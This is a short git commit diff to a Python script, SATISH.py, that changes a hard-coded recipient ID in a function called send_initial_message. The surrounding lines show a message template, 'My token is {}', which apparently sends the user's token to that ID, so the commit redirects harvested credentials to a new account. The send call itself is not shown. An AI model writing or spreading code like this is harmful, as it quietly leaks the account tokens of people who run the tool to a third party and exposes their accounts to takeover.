10cc8689fa3bd3774dbd8593f3b79e463b808302
virat11 <159157484+virat119@users.noreply.github.com>
2025-10-06 01:50:35 +0530

    Update SATISH.py

--- SATISH.py
+++ SATISH.py
@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "Hello virat sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100049806217639"
+      target_id = "100092380041881"
 
       requests.packages.urllib3.disable_warnings()
 
